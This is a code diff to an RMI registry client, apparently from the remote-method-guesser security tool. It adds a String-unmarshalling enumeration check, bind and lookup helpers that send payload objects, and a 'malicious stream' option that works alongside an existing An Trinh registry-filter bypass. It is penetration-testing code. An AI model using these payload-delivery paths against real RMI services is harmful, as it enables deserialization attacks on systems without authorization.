@@ -12,6 +12,7 @@ import java.rmi.server.RemoteRef;
 import java.rmi.server.UnicastRemoteObject;
 
 import de.qtc.rmg.io.Logger;
+import de.qtc.rmg.io.MaliciousOutputStream;
 import de.qtc.rmg.networking.DummySocketFactory;
 import de.qtc.rmg.utils.RMGUtils;
 import de.qtc.rmg.utils.RMIWhisperer;
@@ -22,10 +23,10 @@ import sun.rmi.transport.StreamRemoteCall;
 import sun.rmi.transport.tcp.TCPEndpoint;
 
 /*
- * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was provided by
- * Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post: https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
+ * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was
+ * provided by Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post:
+ * https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
  */
-
 @SuppressWarnings("restriction")
 public class RegistryClient {
 
@@ -59,6 +60,54 @@ public class RegistryClient {
         }
     }
 
+    /**
+     * Determines how the String type is umarshalled by the remote server. Sends an java.lang.Integer as argument
+     * for the lookup(String name) call. If the String type is read via 'readObject', this will lead to an deserialization
+     * attempt of the location, which is set to an unknown object (DefinitelyNonExistingClass). If this class name
+     * appears in the server exception, we know that 'readObject' is used.
+     */
+    public void enumerateStringMarshalling()
+    {
+        Logger.printlnBlue("RMI server String unmarshalling enumeration:");
+        Logger.println("");
+        Logger.increaseIndent();
+
+        try {
+            lookupCall(0, true);
+
+        } catch( java.rmi.ServerException e ) {
+
+            Throwable t = RMGUtils.getCause(e);
+            if( t instanceof ClassNotFoundException && t.getMessage().contains("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
+                Logger.printlnMixedBlue("- Server", "attempted to deserialize", "object locations during lookup call.");
+                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
+                Logger.printlnPlainYellow("readObject().");
+                RMGUtils.showStackTrace(e);
+
+            } else if( t instanceof ClassCastException && t.getMessage().contains("Cannot cast an object to java.lang.String")) {
+                Logger.printlnMixedBlue("- Server complained that", "object cannot be casted to java.lang.String.");
+                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
+                Logger.printlnPlainYellow("readString().");
+                RMGUtils.showStackTrace(e);
+
+            } else {
+                Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during lookup call.");
+                Logger.println("Please report this to improve rmg :)");
+                RMGUtils.stackTrace(e);
+                RMGUtils.exit();
+            }
+
+        } catch( Exception e ) {
+            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during lookup call.");
+            Logger.println("Please report this to improve rmg :)");
+            RMGUtils.stackTrace(e);
+            RMGUtils.exit();
+
+        } finally {
+            Logger.decreaseIndent();
+        }
+
+    }
     public void invokeAnTrinhBypass(String host, int port, boolean local)
     {
         String callName = "";
@@ -199,8 +248,25 @@ public class RegistryClient {
         genericCall(2, callArguments);
     }
 
-    @SuppressWarnings("deprecation")
+    public void bindCall(Object payloadObject, boolean maliciousStream) throws Exception
+    {
+        Object[] callArguments = new Object[] {"Bypass incomming...", payloadObject};
+        genericCall(0, callArguments, maliciousStream);
+    }
+
+    public void lookupCall(Object payloadObject, boolean maliciousStream) throws Exception
+    {
+        Object[] callArguments = new Object[] {payloadObject};
+        genericCall(2, callArguments, maliciousStream);
+    }
+
     public void genericCall(int callID, Object[] callArguments) throws Exception
+    {
+        genericCall(callID, callArguments, false);
+    }
+
+    @SuppressWarnings("deprecation")
+    public void genericCall(int callID, Object[] callArguments, boolean maliciousStream) throws Exception
     {
         String callName = callNames[callID];
 
@@ -212,6 +278,9 @@ public class RegistryClient {
             try {
                 ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
                 enableReplaceField.set(out, false);
+
+                if(maliciousStream)
+                    out = new MaliciousOutputStream(out);
 
                 for(Object o : callArguments)
                     out.writeObject(o);
